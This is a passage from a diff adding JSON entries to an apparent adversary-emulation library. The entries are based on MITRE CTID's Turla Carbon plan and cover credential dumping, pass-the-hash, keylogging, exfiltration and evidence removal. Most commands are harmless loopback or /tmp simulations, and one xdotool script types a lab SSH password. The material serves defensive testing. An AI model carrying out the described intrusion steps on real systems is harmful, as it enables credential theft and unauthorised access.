+                  "source": "second.carbon.id"
+                }
+              ]
+            }
+          }
+        ],
+        "repeatable": null
+      }
+    },
+    {
+      "id": "CTID - Turla - Carbon - T1003 - Mimikatz lsadump (Adversary)",
+      "name": "CTID - Turla - Carbon - T1003 - Mimikatz lsadump (Adversary)",
+      "description": "Task the CARBON-DLL implant on the DC to download and execute mimikatz lsadump Morgana-native operational simulation used because: source requirements need manual verification: external_c2, prior_step.",
+      "tactic": "Credential Access",
+      "tcode": "T1003",
+      "technique_name": "OS Credential Dumping",
+      "executor": "bash",
+      "platform": "linux",
+      "required_tags": [],
+      "required_assets": [],
+      "command": "echo '[START] CTID simulation T1003'; simulation_root=/tmp/morgana-ctid; mkdir -p \"$simulation_root\"; printf 'credential_fixture=synthetic_value\\n' > \"$simulation_root/credentials.txt\"; grep 'credential_fixture' \"$simulation_root/credentials.txt\"; echo '[SUCCESS] CTID simulation T1003 family=credential'",
+      "cleanup_command": "rm -rf /tmp/morgana-ctid",
+      "operational_risk": "modify",
+      "source_metadata": {
+        "provider": "mitre-ctid",
+        "plan": "Turla - Carbon",
+        "plan_type": "full-emulation",
+        "source_plan_id": "eddf38a4-e483-48ec-8874-4983c7a3652b",
+        "source_ability_id": "33d4136a-d5e6-45f2-b0e1-786d3ec8bf02",
+        "source_order": 25,
+        "procedure_step": "6.A.1-3",
+        "procedure_group": "procedure_credential_access",
+        "cti_source": null,
+        "source_path": "turla/Emulation_Plan/yaml/turla_carbon.yaml",
+        "source_documentation": "https://github.com/center-for-threat-informed-defense/adversary_emulation_library/blob/4467a6eed6e67d25009704130e1d27d1a8007f57/turla/Emulation_Plan/yaml/turla_carbon.yaml",
+        "simulation_reasons": [
+          "source requirements need manual verification: external_c2, prior_step"
+        ],
+        "simulation_family": "credential",
+        "source_commit": "4467a6eed6e67d25009704130e1d27d1a8007f57",
+        "conversion_status": "simulated",
+        "manual_reasons": [
+          "source requirements need manual verification: external_c2, prior_step"
+        ],
+        "source_payloads": [],
+        "source_requirements": [
+          {
+            "plugins.emu.app.requirements.check_registered": [
+              {
+                "source": "second.carbon.id"
+              }
+            ]
+          }
+        ],
+        "classified_requirements": [
+          {
+            "classes": [
+              "external_c2",
+              "prior_step"
+            ],
+            "source": {
+              "plugins.emu.app.requirements.check_registered": [
+                {
+                  "source": "second.carbon.id"
+                }
+              ]
+            }
+          }
+        ],
+        "repeatable": null
+      }
+    },
+    {
+      "id": "CTID - Turla - Carbon - X - RDP to 3rd host (User)",
+      "name": "CTID - Turla - Carbon - X - RDP to 3rd host (User)",
+      "description": "Use xfreerdp to RDP into the third host. Then, wait for the login to complete. Morgana-native operational simulation used because: unsupported source executor: proc; source command depends on CALDERA, external C2, or implant primitives.",
+      "tactic": "x",
+      "tcode": "X",
+      "technique_name": "x",
+      "executor": "bash",
+      "platform": "linux",
+      "required_tags": [],
+      "required_assets": [],
+      "command": "echo '[START] CTID simulation X'; simulation_root=/tmp/morgana-ctid; mkdir -p \"$simulation_root\"; (timeout 1 sh -c 'echo CTID > /dev/tcp/127.0.0.1/22' 2>/dev/null || true); echo 'loopback remote-service probe completed'; echo '[SUCCESS] CTID simulation X family=lateral'",
+      "cleanup_command": "rm -rf /tmp/morgana-ctid",
+      "operational_risk": "observe",
+      "source_metadata": {
+        "provider": "mitre-ctid",
+        "plan": "Turla - Carbon",
+        "plan_type": "full-emulation",
+        "source_plan_id": "eddf38a4-e483-48ec-8874-4983c7a3652b",
+        "source_ability_id": "9b50feb8-41a2-489a-a863-75240743734c",
+        "source_order": 26,
+        "procedure_step": "x",
+        "procedure_group": "x",
+        "cti_source": null,
+        "source_path": "turla/Emulation_Plan/yaml/turla_carbon.yaml",
+        "source_documentation": "https://github.com/center-for-threat-informed-defense/adversary_emulation_library/blob/4467a6eed6e67d25009704130e1d27d1a8007f57/turla/Emulation_Plan/yaml/turla_carbon.yaml",
+        "simulation_reasons": [
+          "unsupported source executor: proc",
+          "source command depends on CALDERA, external C2, or implant primitives"
+        ],
+        "simulation_family": "lateral",
+        "source_commit": "4467a6eed6e67d25009704130e1d27d1a8007f57",
+        "conversion_status": "simulated",
+        "manual_reasons": [
+          "unsupported source executor: proc",
+          "source command depends on CALDERA, external C2, or implant primitives"
+        ],
+        "source_payloads": [],
+        "source_requirements": [],
+        "classified_requirements": [],
+        "repeatable": null
+      }
+    },
+    {
+      "id": "CTID - Turla - Carbon - X - Open Microsoft Edge (User)",
+      "name": "CTID - Turla - Carbon - X - Open Microsoft Edge (User)",
+      "description": "Use xdotool to run Microsoft Edge and open a blank page.",
+      "tactic": "x",
+      "tcode": "X",
+      "technique_name": "x",
+      "executor": "bash",
+      "platform": "linux",
+      "required_tags": [
+        "ctid_turla_carbon_third_target_user"
+      ],
+      "required_assets": [],
+      "command": "rdp_pid=$(pgrep -f #{ctid_turla_carbon_third_target_user});\nrdp_window=$(xdotool search --pid \"$rdp_pid\"); \nsleep 6;\nxdotool mousemove --window \"$rdp_window\" 100 100 click 1;\nsleep 6;\nxdotool key --window \"$rdp_window\" Ctrl+Escape;\nsleep 6;\nxdotool type --window \"$rdp_window\" \"run\";\nsleep 6;\nxdotool key --window \"$rdp_window\" Return;\nsleep 6;\nxdotool type --window \"$rdp_window\" \"microsoft-edge\";\nxdotool key --window \"$rdp_window\" shift+colon;\nxdotool key --window \"$rdp_window\" Return;",
+      "cleanup_command": null,
+      "operational_risk": "observe",
+      "source_metadata": {
+        "provider": "mitre-ctid",
+        "plan": "Turla - Carbon",
+        "plan_type": "full-emulation",
+        "source_plan_id": "eddf38a4-e483-48ec-8874-4983c7a3652b",
+        "source_ability_id": "f6690cfd-073d-49c4-bd1b-1194aeb26780",
+        "source_order": 27,
+        "procedure_step": "x",
+        "procedure_group": "x",
+        "cti_source": null,
+        "source_path": "turla/Emulation_Plan/yaml/turla_carbon.yaml",
+        "source_documentation": "https://github.com/center-for-threat-informed-defense/adversary_emulation_library/blob/4467a6eed6e67d25009704130e1d27d1a8007f57/turla/Emulation_Plan/yaml/turla_carbon.yaml",
+        "simulation_reasons": [],
+        "simulation_family": null,
+        "source_commit": "4467a6eed6e67d25009704130e1d27d1a8007f57",
+        "conversion_status": "ready",
+        "manual_reasons": [],
+        "source_payloads": [],
+        "source_requirements": [],
+        "classified_requirements": [],
+        "repeatable": null
+      }
+    },
+    {
+      "id": "CTID - Turla - Carbon - T1105 - Download PsExec (Adversary)",
+      "name": "CTID - Turla - Carbon - T1105 - Download PsExec (Adversary)",
+      "description": "Task the CARBON-DLL implant on the domain controller to download PsExec. Morgana-native operational simulation used because: source requirements need manual verification: external_c2, prior_step.",
+      "tactic": "Command and Control",
+      "tcode": "T1105",
+      "technique_name": "Ingress tool transfer",
+      "executor": "bash",
+      "platform": "linux",
+      "required_tags": [],
+      "required_assets": [],
+      "command": "echo '[START] CTID simulation T1105'; simulation_root=/tmp/morgana-ctid; mkdir -p \"$simulation_root\"; python3 -c \"import socket,threading; s=socket.socket(); s.bind(('127.0.0.1',0)); s.listen(1); p=s.getsockname()[1]; threading.Thread(target=lambda: s.accept()[0].recv(64),daemon=True).start(); c=socket.create_connection(('127.0.0.1',p)); c.sendall(b'CTID network simulation'); c.close(); s.close(); print('loopback network telemetry',p)\"; echo '[SUCCESS] CTID simulation T1105 family=network'",
+      "cleanup_command": "rm -rf /tmp/morgana-ctid",
+      "operational_risk": "observe",
+      "source_metadata": {
+        "provider": "mitre-ctid",
+        "plan": "Turla - Carbon",
+        "plan_type": "full-emulation",
+        "source_plan_id": "eddf38a4-e483-48ec-8874-4983c7a3652b",
+        "source_ability_id": "f9ad6b77-518e-4784-9fba-5e4cd97fc455",
+        "source_order": 28,
+        "procedure_step": "7.A.1",
+        "procedure_group": "procedure_command_and_control",
+        "cti_source": null,
+        "source_path": "turla/Emulation_Plan/yaml/turla_carbon.yaml",
+        "source_documentation": "https://github.com/center-for-threat-informed-defense/adversary_emulation_library/blob/4467a6eed6e67d25009704130e1d27d1a8007f57/turla/Emulation_Plan/yaml/turla_carbon.yaml",
+        "simulation_reasons": [
+          "source requirements need manual verification: external_c2, prior_step"
+        ],
+        "simulation_family": "network",
+        "source_commit": "4467a6eed6e67d25009704130e1d27d1a8007f57",
+        "conversion_status": "simulated",
+        "manual_reasons": [
+          "source requirements need manual verification: external_c2, prior_step"
+        ],
+        "source_payloads": [],
+        "source_requirements": [
+          {
+            "plugins.emu.app.requirements.check_registered": [
+              {
+                "source": "second.carbon.id"
+              }
+            ]
+          }
+        ],
+        "classified_requirements": [
+          {
+            "classes": [
+              "external_c2",
+              "prior_step"
+            ],
+            "source": {
+              "plugins.emu.app.requirements.check_registered": [
+                {
+                  "source": "second.carbon.id"
+                }
+              ]
+            }
+          }
+        ],
+        "repeatable": null
+      }
+    },
+    {
+      "id": "CTID - Turla - Carbon - T1105 - Download third CARBON-DLL (Adversary)",
+      "name": "CTID - Turla - Carbon - T1105 - Download third CARBON-DLL (Adversary)",
+      "description": "Task the CARBON-DLL implant on the domain controller to download a third copy of the CARBON-DLL installer. Morgana-native operational simulation used because: source requirements need manual verification: external_c2, prior_step.",
+      "tactic": "Command and Control",
+      "tcode": "T1105",
+      "technique_name": "Ingress tool transfer",
+      "executor": "bash",
+      "platform": "linux",
+      "required_tags": [],
+      "required_assets": [],
+      "command": "echo '[START] CTID simulation T1105'; simulation_root=/tmp/morgana-ctid; mkdir -p \"$simulation_root\"; python3 -c \"import socket,threading; s=socket.socket(); s.bind(('127.0.0.1',0)); s.listen(1); p=s.getsockname()[1]; threading.Thread(target=lambda: s.accept()[0].recv(64),daemon=True).start(); c=socket.create_connection(('127.0.0.1',p)); c.sendall(b'CTID network simulation'); c.close(); s.close(); print('loopback network telemetry',p)\"; echo '[SUCCESS] CTID simulation T1105 family=network'",
+      "cleanup_command": "rm -rf /tmp/morgana-ctid",
+      "operational_risk": "observe",
+      "source_metadata": {
+        "provider": "mitre-ctid",
+        "plan": "Turla - Carbon",
+        "plan_type": "full-emulation",
+        "source_plan_id": "eddf38a4-e483-48ec-8874-4983c7a3652b",
+        "source_ability_id": "75424a6a-28f5-46fa-834b-508f7d09020a",
+        "source_order": 29,
+        "procedure_step": "7.A.2",
+        "procedure_group": "procedure_command_and_control",
+        "cti_source": null,
+        "source_path": "turla/Emulation_Plan/yaml/turla_carbon.yaml",
+        "source_documentation": "https://github.com/center-for-threat-informed-defense/adversary_emulation_library/blob/4467a6eed6e67d25009704130e1d27d1a8007f57/turla/Emulation_Plan/yaml/turla_carbon.yaml",
+        "simulation_reasons": [
+          "source requirements need manual verification: external_c2, prior_step"
+        ],
+        "simulation_family": "network",
+        "source_commit": "4467a6eed6e67d25009704130e1d27d1a8007f57",
+        "conversion_status": "simulated",
+        "manual_reasons": [
+          "source requirements need manual verification: external_c2, prior_step"
+        ],
+        "source_payloads": [],
+        "source_requirements": [
+          {
+            "plugins.emu.app.requirements.check_registered": [
+              {
+                "source": "second.carbon.id"
+              }
+            ]
+          }
+        ],
+        "classified_requirements": [
+          {
+            "classes": [
+              "external_c2",
+              "prior_step"
+            ],
+            "source": {
+              "plugins.emu.app.requirements.check_registered": [
+                {
+                  "source": "second.carbon.id"
+                }
+              ]
+            }
+          }
+        ],
+        "repeatable": null
+      }
+    },
+    {
+      "id": "CTID - Turla - Carbon - T1550.002 - Copy installer & execute using PsExec (Adversary)",
+      "name": "CTID - Turla - Carbon - T1550.002 - Copy installer & execute using PsExec (Adversary)",
+      "description": "Task the CARBON-DLL implant on the domain controller to use the previously downloaded Mimikatz to pass-the-hash and (1) copy the installer to Adalwolfa's workstation and (2) execute it using PsExec. Morgana-native operational simulation used because: source requirements need manual verification: external_c2, prior_step.",
+      "tactic": "Lateral Movement",
+      "tcode": "T1550.002",
+      "technique_name": "Use Alternate Authentication Material: Pass the Hash",
+      "executor": "bash",
+      "platform": "linux",
+      "required_tags": [],
+      "required_assets": [],
+      "command": "echo '[START] CTID simulation T1550.002'; simulation_root=/tmp/morgana-ctid; mkdir -p \"$simulation_root\"; (timeout 1 sh -c 'echo CTID > /dev/tcp/127.0.0.1/22' 2>/dev/null || true); echo 'loopback remote-service probe completed'; echo '[SUCCESS] CTID simulation T1550.002 family=lateral'",
+      "cleanup_command": "rm -rf /tmp/morgana-ctid",
+      "operational_risk": "modify",
+      "source_metadata": {
+        "provider": "mitre-ctid",
+        "plan": "Turla - Carbon",
+        "plan_type": "full-emulation",
+        "source_plan_id": "eddf38a4-e483-48ec-8874-4983c7a3652b",
+        "source_ability_id": "824d5eda-7743-4c10-89d8-143d4bc50eda",
+        "source_order": 30,
+        "procedure_step": "7.A.3",
+        "procedure_group": "procedure_lateral_movement",
+        "cti_source": null,
+        "source_path": "turla/Emulation_Plan/yaml/turla_carbon.yaml",
+        "source_documentation": "https://github.com/center-for-threat-informed-defense/adversary_emulation_library/blob/4467a6eed6e67d25009704130e1d27d1a8007f57/turla/Emulation_Plan/yaml/turla_carbon.yaml",
+        "simulation_reasons": [
+          "source requirements need manual verification: external_c2, prior_step"
+        ],
+        "simulation_family": "lateral",
+        "source_commit": "4467a6eed6e67d25009704130e1d27d1a8007f57",
+        "conversion_status": "simulated",
+        "manual_reasons": [
+          "source requirements need manual verification: external_c2, prior_step"
+        ],
+        "source_payloads": [],
+        "source_requirements": [
+          {
+            "plugins.emu.app.requirements.check_registered": [
+              {
+                "source": "second.carbon.id"
+              }
+            ]
+          }
+        ],
+        "classified_requirements": [
+          {
+            "classes": [
+              "external_c2",
+              "prior_step"
+            ],
+            "source": {
+              "plugins.emu.app.requirements.check_registered": [
+                {
+                  "source": "second.carbon.id"
+                }
+              ]
+            }
+          }
+        ],
+        "repeatable": null
+      }
+    },
+    {
+      "id": "CTID - Turla - Carbon - 7.A.5 - Clean dropped files (Adversary)",
+      "name": "CTID - Turla - Carbon - 7.A.5 - Clean dropped files (Adversary)",
+      "description": "Task the CARBON-DLL implant on the domain controller to clean up dropped files. Morgana-native operational simulation used because: source requirements need manual verification: external_c2, prior_step.",
+      "tactic": "Defense Evasion",
+      "tcode": "7.A.5",
+      "technique_name": "Indicator Removal on Host: File Deletion",
+      "executor": "bash",
+      "platform": "linux",
+      "required_tags": [],
+      "required_assets": [],
+      "command": "echo '[START] CTID simulation 7.A.5'; simulation_root=/tmp/morgana-ctid; mkdir -p \"$simulation_root\"; printf 'CTID transient activity\\n' > \"$simulation_root/transient.log\"; : > \"$simulation_root/transient.log\"; ls -l \"$simulation_root/transient.log\"; echo '[SUCCESS] CTID simulation 7.A.5 family=evasion'",
+      "cleanup_command": "rm -rf /tmp/morgana-ctid",
+      "operational_risk": "observe",
+      "source_metadata": {
+        "provider": "mitre-ctid",
+        "plan": "Turla - Carbon",
+        "plan_type": "full-emulation",
+        "source_plan_id": "eddf38a4-e483-48ec-8874-4983c7a3652b",
+        "source_ability_id": "e7c827d6-57f8-40d0-b3a9-e03b2e4d0484",
+        "source_order": 31,
+        "procedure_step": "T1070.004",
+        "procedure_group": "procedure_defense_evasion",
+        "cti_source": null,
+        "source_path": "turla/Emulation_Plan/yaml/turla_carbon.yaml",
+        "source_documentation": "https://github.com/center-for-threat-informed-defense/adversary_emulation_library/blob/4467a6eed6e67d25009704130e1d27d1a8007f57/turla/Emulation_Plan/yaml/turla_carbon.yaml",
+        "simulation_reasons": [
+          "source requirements need manual verification: external_c2, prior_step"
+        ],
+        "simulation_family": "evasion",
+        "source_commit": "4467a6eed6e67d25009704130e1d27d1a8007f57",
+        "conversion_status": "simulated",
+        "manual_reasons": [
+          "source requirements need manual verification: external_c2, prior_step"
+        ],
+        "source_payloads": [],
+        "source_requirements": [
+          {
+            "plugins.emu.app.requirements.check_registered": [
+              {
+                "source": "second.carbon.id"
+              }
+            ]
+          }
+        ],
+        "classified_requirements": [
+          {
+            "classes": [
+              "external_c2",
+              "prior_step"
+            ],
+            "source": {
+              "plugins.emu.app.requirements.check_registered": [
+                {
+                  "source": "second.carbon.id"
+                }
+              ]
+            }
+          }
+        ],
+        "repeatable": null
+      }
+    },
+    {
+      "id": "CTID - Turla - Carbon - 8.A.2 - Download and execute keylogger (Adversary)",
+      "name": "CTID - Turla - Carbon - 8.A.2 - Download and execute keylogger (Adversary)",
+      "description": "Task the CARBON-DLL on Adalwolfa's workstation to download and execute the keylogger binary in the background. Morgana-native operational simulation used because: source requirements need manual verification: external_c2, prior_step.",
+      "tactic": "Collection",
+      "tcode": "8.A.2",
+      "technique_name": "Input Capture: Keylogging",
+      "executor": "bash",
+      "platform": "linux",
+      "required_tags": [],
+      "required_assets": [],
+      "command": "echo '[START] CTID simulation 8.A.2'; simulation_root=/tmp/morgana-ctid; mkdir -p \"$simulation_root\"; mkdir -p \"$simulation_root/collection\"; printf 'CTID sample data\\n' > \"$simulation_root/collection/sample.txt\"; tar -czf \"$simulation_root/collection.tar.gz\" -C \"$simulation_root\" collection; ls -l \"$simulation_root/collection.tar.gz\"; echo '[SUCCESS] CTID simulation 8.A.2 family=collection'",
+      "cleanup_command": "rm -rf /tmp/morgana-ctid",
+      "operational_risk": "interact",
+      "source_metadata": {
+        "provider": "mitre-ctid",
+        "plan": "Turla - Carbon",
+        "plan_type": "full-emulation",
+        "source_plan_id": "eddf38a4-e483-48ec-8874-4983c7a3652b",
+        "source_ability_id": "1a9e352f-4edb-480d-b29c-66acb6c4df19",
+        "source_order": 32,
+        "procedure_step": "T1056.001",
+        "procedure_group": "procedure_collection",
+        "cti_source": null,
+        "source_path": "turla/Emulation_Plan/yaml/turla_carbon.yaml",
+        "source_documentation": "https://github.com/center-for-threat-informed-defense/adversary_emulation_library/blob/4467a6eed6e67d25009704130e1d27d1a8007f57/turla/Emulation_Plan/yaml/turla_carbon.yaml",
+        "simulation_reasons": [
+          "source requirements need manual verification: external_c2, prior_step"
+        ],
+        "simulation_family": "collection",
+        "source_commit": "4467a6eed6e67d25009704130e1d27d1a8007f57",
+        "conversion_status": "simulated",
+        "manual_reasons": [
+          "source requirements need manual verification: external_c2, prior_step"
+        ],
+        "source_payloads": [],
+        "source_requirements": [
+          {
+            "plugins.emu.app.requirements.check_registered": [
+              {
+                "source": "third.carbon.id"
+              }
+            ]
+          }
+        ],
+        "classified_requirements": [
+          {
+            "classes": [
+              "external_c2",
+              "prior_step"
+            ],
+            "source": {
+              "plugins.emu.app.requirements.check_registered": [
+                {
+                  "source": "third.carbon.id"
+                }
+              ]
+            }
+          }
+        ],
+        "repeatable": null
+      }
+    },
+    {
+      "id": "CTID - Turla - Carbon - X - Adalwolfa types keylogged data (User)",
+      "name": "CTID - Turla - Carbon - X - Adalwolfa types keylogged data (User)",
+      "description": "Xdotools will open powershell on the third target, ssh into the Apache server, type password, and exit ssh session.",
+      "tactic": "x",
+      "tcode": "X",
+      "technique_name": "x",
+      "executor": "bash",
+      "platform": "linux",
+      "required_tags": [
+        "ctid_turla_carbon_third_target_user",
+        "ctid_turla_carbon_apache_server_ip"
+      ],
+      "required_assets": [],
+      "command": "rdp_pid=$(pgrep -f #{ctid_turla_carbon_third_target_user});\nrdp_window=$(xdotool search --pid \"$rdp_pid\"); \n\nxdotool mousemove --window \"$rdp_window\" 100 100 click 1;\nxdotool key --window \"$rdp_window\" Ctrl+Escape;\nsleep 5;\nxdotool type --window \"$rdp_window\" \"powershell\";\nsleep 5;\nxdotool key --window \"$rdp_window\" Return;\nsleep 5;\nxdotool key --window \"$rdp_window\" Ctrl+Escape;\nxdotool key --window \"$rdp_window\" Ctrl+Escape;\nsleep 5;\n\nxdotool type --window \"$rdp_window\" 'ssh #{ctid_turla_carbon_third_target_user}@#{ctid_turla_carbon_apache_server_ip}';\nsleep 5;\nxdotool key --window \"$rdp_window\" Return;\nsleep 5; \nxdotool type --window \"$rdp_window\" 'yes';\nsleep 5;\nxdotool key --window \"$rdp_window\" Return;\nsleep 5;\nxdotool key --window \"$rdp_window\" Shift+P;\nxdotool type --window \"$rdp_window\" 'assword2';\nxdotool key --window \"$rdp_window\" Shift+1;\nxdotool key --window \"$rdp_window\" Return;\nxdotool type --window \"$rdp_window\" 'exit';\nxdotool key --window \"$rdp_window\" Return;\nsleep 10;",
+      "cleanup_command": null,
+      "operational_risk": "observe",
+      "source_metadata": {
+        "provider": "mitre-ctid",
+        "plan": "Turla - Carbon",
+        "plan_type": "full-emulation",
+        "source_plan_id": "eddf38a4-e483-48ec-8874-4983c7a3652b",
+        "source_ability_id": "4cedd0ef-c802-431d-a4a1-eaf1163543f3",
+        "source_order": 33,
+        "procedure_step": "x",
+        "procedure_group": "x",
+        "cti_source": null,
+        "source_path": "turla/Emulation_Plan/yaml/turla_carbon.yaml",
+        "source_documentation": "https://github.com/center-for-threat-informed-defense/adversary_emulation_library/blob/4467a6eed6e67d25009704130e1d27d1a8007f57/turla/Emulation_Plan/yaml/turla_carbon.yaml",
+        "simulation_reasons": [],
+        "simulation_family": null,
+        "source_commit": "4467a6eed6e67d25009704130e1d27d1a8007f57",
+        "conversion_status": "ready",
+        "manual_reasons": [],
+        "source_payloads": [],
+        "source_requirements": [],
+        "classified_requirements": [],
+        "repeatable": null
+      }
+    },
+    {
+      "id": "CTID - Turla - Carbon - 8.A.2 - Kill keylogger process (Adversary)",
+      "name": "CTID - Turla - Carbon - 8.A.2 - Kill keylogger process (Adversary)",
+      "description": "Task the CARBON-DLL implant on Adalwolfa's workstation to kill the keylogger process. Morgana-native operational simulation used because: source requirements need manual verification: external_c2, prior_step.",
+      "tactic": "Collection",
+      "tcode": "8.A.2",
+      "technique_name": "Input Capture: Keylogging",
+      "executor": "bash",
+      "platform": "linux",
+      "required_tags": [],
+      "required_assets": [],
+      "command": "echo '[START] CTID simulation 8.A.2'; simulation_root=/tmp/morgana-ctid; mkdir -p \"$simulation_root\"; mkdir -p \"$simulation_root/collection\"; printf 'CTID sample data\\n' > \"$simulation_root/collection/sample.txt\"; tar -czf \"$simulation_root/collection.tar.gz\" -C \"$simulation_root\" collection; ls -l \"$simulation_root/collection.tar.gz\"; echo '[SUCCESS] CTID simulation 8.A.2 family=collection'",
+      "cleanup_command": "rm -rf /tmp/morgana-ctid",
+      "operational_risk": "interact",
+      "source_metadata": {
+        "provider": "mitre-ctid",
+        "plan": "Turla - Carbon",
+        "plan_type": "full-emulation",
+        "source_plan_id": "eddf38a4-e483-48ec-8874-4983c7a3652b",
+        "source_ability_id": "cefe85b8-d1e5-4077-afac-81a6622f4c66",
+        "source_order": 34,
+        "procedure_step": "T1056.001",
+        "procedure_group": "procedure_collection",
+        "cti_source": null,
+        "source_path": "turla/Emulation_Plan/yaml/turla_carbon.yaml",
+        "source_documentation": "https://github.com/center-for-threat-informed-defense/adversary_emulation_library/blob/4467a6eed6e67d25009704130e1d27d1a8007f57/turla/Emulation_Plan/yaml/turla_carbon.yaml",
+        "simulation_reasons": [
+          "source requirements need manual verification: external_c2, prior_step"
+        ],
+        "simulation_family": "collection",
+        "source_commit": "4467a6eed6e67d25009704130e1d27d1a8007f57",
+        "conversion_status": "simulated",
+        "manual_reasons": [
+          "source requirements need manual verification: external_c2, prior_step"
+        ],
+        "source_payloads": [],
+        "source_requirements": [
+          {
+            "plugins.emu.app.requirements.check_registered": [
+              {
+                "source": "third.carbon.id"
+              }
+            ]
+          }
+        ],
+        "classified_requirements": [
+          {
+            "classes": [
+              "external_c2",
+              "prior_step"
+            ],
+            "source": {
+              "plugins.emu.app.requirements.check_registered": [
+                {
+                  "source": "third.carbon.id"
+                }
+              ]
+            }
+          }
+        ],
+        "repeatable": null
+      }
+    },
+    {
+      "id": "CTID - Turla - Carbon - 8.A.2 - Exfiltrate keylogged data (Adversary)",
+      "name": "CTID - Turla - Carbon - 8.A.2 - Exfiltrate keylogged data (Adversary)",
+      "description": "Task the CARBON-DLL implant to exfiltrate the data written to the keylogger file Morgana-native operational simulation used because: source requirements need manual verification: external_c2, prior_step.",
+      "tactic": "Collection",
+      "tcode": "8.A.2",
+      "technique_name": "Input Capture: Keylogging",
+      "executor": "bash",
+      "platform": "linux",
+      "required_tags": [],
+      "required_assets": [],
+      "command": "echo '[START] CTID simulation 8.A.2'; simulation_root=/tmp/morgana-ctid; mkdir -p \"$simulation_root\"; python3 -c \"import socket,threading; s=socket.socket(); s.bind(('127.0.0.1',0)); s.listen(1); p=s.getsockname()[1]; threading.Thread(target=lambda: s.accept()[0].recv(64),daemon=True).start(); c=socket.create_connection(('127.0.0.1',p)); c.sendall(b'CTID network simulation'); c.close(); s.close(); print('loopback network telemetry',p)\"; echo '[SUCCESS] CTID simulation 8.A.2 family=network'",
+      "cleanup_command": "rm -rf /tmp/morgana-ctid",
+      "operational_risk": "interact",
+      "source_metadata": {
+        "provider": "mitre-ctid",
+        "plan": "Turla - Carbon",
+        "plan_type": "full-emulation",
+        "source_plan_id": "eddf38a4-e483-48ec-8874-4983c7a3652b",
+        "source_ability_id": "438939c8-e95a-4fbd-b659-06f0b0b72e47",
+        "source_order": 35,
+        "procedure_step": "T1056.001",
+        "procedure_group": "procedure_collection",
+        "cti_source": null,
+        "source_path": "turla/Emulation_Plan/yaml/turla_carbon.yaml",
+        "source_documentation": "https://github.com/center-for-threat-informed-defense/adversary_emulation_library/blob/4467a6eed6e67d25009704130e1d27d1a8007f57/turla/Emulation_Plan/yaml/turla_carbon.yaml",
+        "simulation_reasons": [
+          "source requirements need manual verification: external_c2, prior_step"
+        ],
+        "simulation_family": "network",
+        "source_commit": "4467a6eed6e67d25009704130e1d27d1a8007f57",
+        "conversion_status": "simulated",
+        "manual_reasons": [
+          "source requirements need manual verification: external_c2, prior_step"
+        ],
+        "source_payloads": [],
+        "source_requirements": [
+          {
+            "plugins.emu.app.requirements.check_registered": [
+              {
+                "source": "third.carbon.id"
+              }
+            ]
+          }
+        ],
+        "classified_requirements": [
+          {
+            "classes": [
+              "external_c2",
+              "prior_step"
+            ],
+            "source": {
+              "plugins.emu.app.requirements.check_registered": [
+                {
+                  "source": "third.carbon.id"
+                }
+              ]
+            }
+          }
+        ],
+        "repeatable": null
+      }
+    },
+    {
+      "id": "CTID - Turla - Carbon - T1070.004 - Remove keylogging evidence (Adversary)",
+      "name": "CTID - Turla - Carbon - T1070.004 - Remove keylogging evidence (Adversary)",
+      "description": "Task the CARBON-DLL implant to remove the keylogger and keylogger output file. Morgana-native operational simulation used because: source requirements need manual verification: external_c2, prior_step.",
+      "tactic": "Defense Evasion",
+      "tcode": "T1070.004",
+      "technique_name": "Indicator Removal on Host: File Deletion",
+      "executor": "bash",
+      "platform": "linux",
+      "required_tags": [],
+      "required_assets": [],
+      "command": "echo '[START] CTID simulation T1070.004'; simulation_root=/tmp/morgana-ctid; mkdir -p \"$simulation_root\"; printf 'CTID transient activity\\n' > \"$simulation_root/transient.log\"; : > \"$simulation_root/transient.log\"; ls -l \"$simulation_root/transient.log\"; echo '[SUCCESS] CTID simulation T1070.004 family=evasion'",
+      "cleanup_command": "rm -rf /tmp/morgana-ctid",
+      "operational_risk": "observe",
+      "source_metadata": {
+        "provider": "mitre-ctid",
+        "plan": "Turla - Carbon",
+        "plan_type": "full-emulation",
+        "source_plan_id": "eddf38a4-e483-48ec-8874-4983c7a3652b",
+        "source_ability_id": "f8ab9b59-89a7-4c25-90bf-0c2485785a36",
+        "source_order": 36,
+        "procedure_step": "8.A.3",
+        "procedure_group": "procedure_defense_evasion",
+        "cti_source": null,
+        "source_path": "turla/Emulation_Plan/yaml/turla_carbon.yaml",
+        "source_documentation": "https://github.com/center-for-threat-informed-defense/adversary_emulation_library/blob/4467a6eed6e67d25009704130e1d27d1a8007f57/turla/Emulation_Plan/yaml/turla_carbon.yaml",
+        "simulation_reasons": [
+          "source requirements need manual verification: external_c2, prior_step"
+        ],
+        "simulation_family": "evasion",
+        "source_commit": "4467a6eed6e67d25009704130e1d27d1a8007f57",
+        "conversion_status": "simulated",
+        "manual_reasons": [
+          "source requirements need manual verification: external_c2, prior_step"
+        ],
+        "source_payloads": [],
+        "source_requirements": [
+          {
+            "plugins.emu.app.requirements.check_registered": [
+              {
+                "source": "third.carbon.id"
+              }
+            ]
+          }
+        ],
+        "classified_requirements": [
+          {
+            "classes": [
+              "external_c2",
+              "prior_step"
+            ],
+            "source": {
+              "plugins.emu.app.requirements.check_registered": [
+                {
+                  "source": "third.carbon.id"
+                }
+              ]
+            }
+          }
+        ],
+        "repeatable": null
+      }
+    },
+    {
+      "id": "CTID - Turla - Carbon - T1105 - Download Penquin (Adversary)",
+      "name": "CTID - Turla - Carbon - T1105 - Download Penquin (Adversary)",
+      "description": "Task the CARBON-DLL implant on Adawolfa's workstation to download Penquin (named tmp504e.tmp). Morgana-native operational simulation used because: source requirements need manual verification: external_c2, prior_step.",
+      "tactic": "Command and Control",
+      "tcode": "T1105",
+      "technique_name": "Ingress Tool Transfer",
+      "executor": "bash",
+      "platform": "linux",
+      "required_tags": [],
+      "required_assets": [],
+      "command": "echo '[START] CTID simulation T1105'; simulation_root=/tmp/morgana-ctid; mkdir -p \"$simulation_root\"; python3 -c \"import socket,threading; s=socket.socket(); s.bind(('127.0.0.1',0)); s.listen(1); p=s.getsockname()[1]; threading.Thread(target=lambda: s.accept()[0].recv(64),daemon=True).start(); c=socket.create_connection(('127.0.0.1',p)); c.sendall(b'CTID network simulation'); c.close(); s.close(); print('loopback network telemetry',p)\"; echo '[SUCCESS] CTID simulation T1105 family=network'",
+      "cleanup_command": "rm -rf /tmp/morgana-ctid",
+      "operational_risk": "observe",
+      "source_metadata": {
+        "provider": "mitre-ctid",
+        "plan": "Turla - Carbon",
+        "plan_type": "full-emulation",
+        "source_plan_id": "eddf38a4-e483-48ec-8874-4983c7a3652b",
+        "source_ability_id": "4d5197fa-4ba7-4bfd-9c91-1697ce0a80a4",
+        "source_order": 37,
+        "procedure_step": "9.A.1",
